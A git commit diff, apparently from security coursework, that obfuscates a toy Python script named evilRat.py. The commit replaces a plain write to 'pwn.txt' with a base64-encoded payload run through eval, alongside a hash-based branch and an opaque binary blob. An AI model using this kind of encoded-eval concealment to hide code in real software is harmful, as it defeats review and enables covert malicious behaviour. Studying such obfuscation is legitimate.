e395b3e0d84f91f340495101e1fbbeda94e89b23
Logan Praneis <lpraneis@gmail.com>
2019-04-25 19:38:19 -0500

    obfuscated evilRat

--- hw5/code/evilRat.py
+++ hw5/code/evilRat.py
@@ -5,10 +5,11 @@ blob = '''þØÙ”6Ÿ¸¤yæÿáÔÚôvµóË3ó3ÒCÆ—çšÛ·Àì-ògÆáÔ-“ ƒ	·é1òU6'þñH!M%ÎÕ;uŽY
 
 import sys
 import hashlib
+import base64
 h = hashlib.sha256(bytes(sys.argv[0])).hexdigest()
 if (h == '9149cfdb31962bcd0faf5cf6dc0080bdf1838c5bcdae84fceac355f52d890462' or 
         h == 'f9406dd57654654883e2c3dbfc40c096a3e57a440eadffb0d079a542a7fc67e9'):
     print "(o:)3 - ({})".format(sys.argv[1])
 else:
-    with open('pwn.txt', 'a') as f:
-        f.write(sys.argv[1]+'\n')
+    s = 'd2l0aCBvcGVuKCdwd24udHh0JywgJ2EnKSBhcyBmOgoJZi53cml0ZShzeXMuYXJndlsxXSk='
+    eval(compile(base64.b64decode(s), '<string>', 'exec'))
